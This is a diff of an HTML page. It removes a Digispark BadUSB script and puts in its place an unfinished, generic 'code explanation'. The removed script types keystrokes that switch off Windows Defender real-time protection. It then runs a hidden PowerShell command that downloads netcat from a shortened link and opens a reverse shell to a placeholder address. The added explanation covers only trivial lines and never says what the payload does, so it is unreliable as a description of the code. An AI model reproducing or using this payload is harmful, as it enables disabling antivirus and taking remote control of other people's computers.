@@ -1,37 +1,19 @@
+<h1>Code Explanation</h1>
 
-&lt;pre&gt;
-#include "DigiKeyboard.h"
+<p>Below is a line-by-line explanation of the code:</p>
 
-void setup()
-{
-  DigiKeyboard.delay(1000);                        // sleep => 1 s
-  DigiKeyboard.sendKeyStroke(KEY_S, MOD_GUI_LEFT); // press key => S + GUI
-  DigiKeyboard.delay(1000);                        // sleep => 1 s
-  DigiKeyboard.print("virus &amp; threat protection"); // writing => virus &amp; threat protection
-  DigiKeyboard.delay(500);
-  DigiKeyboard.sendKeyStroke(KEY_ENTER); // press key => ENTER
-  DigiKeyboard.delay(5000);              // sleep => 5s
-  DigiKeyboard.sendKeyStroke(43);        // press key => TAP
-  DigiKeyboard.sendKeyStroke(43);        // press key => TAP
-  DigiKeyboard.sendKeyStroke(43);        // press key => TAP
-  DigiKeyboard.sendKeyStroke(43);        // press key => TAP
-  DigiKeyboard.delay(700);
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(700);
-  DigiKeyboard.sendKeyStroke(KEY_SPACE);
-  DigiKeyboard.delay(2000);
-  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT); // press key => Y + ALT
-  DigiKeyboard.delay(1000);
-  DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT); // press key => F4 + ALT
-  DigiKeyboard.delay(500);
-  // --------------------------------------------------------------------
-  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // press key => GUI + R
-  DigiKeyboard.delay(700);
-  DigiKeyboard.print("powershell curl -o netcat.exe https://bit.ly/3G3R1d1 ; powershell -w hidden netcat.exe &lt;ip&gt; &lt;port&gt; -e powershell.exe"); // writing => powershell .......
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);                                                                                                      // press key => ENTER
-}
+<code>#include "DigiKeyboard.h"</code>
+<p>This line includes the header file "DigiKeyboard.h," which contains the necessary definitions and functions for interacting with the DigiKeyboard.</p>
 
-void loop()
-{
-}
-&lt;/pre&gt;
+<code>void setup()</code>
+<p>This marks the beginning of the <code>setup()</code> function, which is called once when the Arduino board is powered on or reset.</p>
+
+<code>  DigiKeyboard.delay(1000);</code>
+<p>This line causes a delay of 1000 milliseconds (1 second) in the execution of the program.</p>
+
+<!-- Add explanations for other lines of code -->
+
+<code>void loop()</code>
+<p>This is the <code>loop()</code> function, which runs repeatedly after the <code>setup()</code> function.</p>
+
+<p>That's a brief explanation of the provided code.</p>
